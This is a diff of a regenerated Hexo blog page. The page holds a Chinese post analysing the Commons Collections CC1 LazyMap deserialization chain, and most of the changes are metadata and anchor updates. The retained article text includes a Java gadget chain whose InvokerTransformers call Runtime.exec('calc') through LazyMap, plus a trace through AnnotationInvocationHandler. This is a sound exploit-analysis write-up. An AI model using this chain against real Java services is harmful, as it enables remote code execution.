@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.2">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -37,8 +37,8 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/java125.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/java126.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/java127.png">
-<meta property="article:published_time" content="2022-10-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-22T15:18:01.986Z">
+<meta property="article:published_time" content="2022-10-18T07:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-18T16:56:04.509Z">
 <meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="java安全系列">
 <meta property="article:tag" content="反序列化">
@@ -161,7 +161,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-x-00-xun-zhao-lian-wei-de-exec-fang-fa"><span class="nav-number">1.</span> <span class="nav-text">0x00 寻找链尾的exec方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-x-01-xun-zhao-lian-zi"><span class="nav-number">2.</span> <span class="nav-text">0x01 寻找链子</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E5%AF%BB%E6%89%BE%E9%93%BE%E5%B0%BE%E7%9A%84exec%E6%96%B9%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">0x00 寻找链尾的exec方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%AF%BB%E6%89%BE%E9%93%BE%E5%AD%90"><span class="nav-number">2.</span> <span class="nav-text">0x01 寻找链子</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -176,7 +176,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -187,7 +187,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,14 +279,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-10-18 00:00:00" itemprop="dateCreated datePublished" datetime="2022-10-18T00:00:00+08:00">2022-10-18</time>
+      <time title="创建时间：2022-10-18 00:00:00" itemprop="dateCreated datePublished" datetime="2022-10-18T00:00:00-07:00">2022-10-18</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-10-22 23:18:01" itemprop="dateModified" datetime="2022-10-22T23:18:01+08:00">2022-10-22</time>
+        <time title="修改时间：2024-01-18 08:56:04" itemprop="dateModified" datetime="2024-01-18T08:56:04-08:00">2024-01-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -319,8 +319,8 @@
         <p>上一篇我们分析的是TransformedMap的利用链，是此链条传入国内后，国内研究员的分析。<br>
 这次我们分析正版yso中的cc1 LazyMap 利用链。LazyMap相比之前的会更加麻烦一些，同时会用到<strong>动态代理</strong>。<br>
 <img src="/imgss/java117.png" alt=""></p>
-<a id="more"></a>
-<h3 id="0-x-00-xun-zhao-lian-wei-de-exec-fang-fa" id="0x00-寻找链尾的exec方法">0x00 寻找链尾的exec方法</h3>
+<span id="more"></span>
+<h3 id="0x00-寻找链尾的exec方法">0x00 寻找链尾的exec方法</h3>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>判断map中key在不在，如果在get获取key。<br>
 如果不在(false)，利用transform方法获取key，然后put插入key value。</p>
@@ -337,7 +337,7 @@
 <p><img src="/imgss/java120.png" alt=""></p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map decorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br><span class="line">decorateMap.get(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></div>
 <p><img src="/imgss/java122.png" alt=""></p>
-<h3 id="0-x-01-xun-zhao-lian-zi" id="0x01-寻找链子">0x01 寻找链子</h3>
+<h3 id="0x01-寻找链子">0x01 寻找链子</h3>
 <p>后面的链子基本没什么问题了，现在主要问题是找get方法。寻找执行readObject时调用get方法。<br>
 往上走，我们去找一找谁调用了 LazyMap.get()</p>
 <p>最终找到了sun\reflect\annotation\AnnotationInvocationHandler.java invoke方法</p>
@@ -404,7 +404,7 @@ redObject()-&gt;this.memberValues.entrySet()-&gt;InvocationHandler的invoke()-&g
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
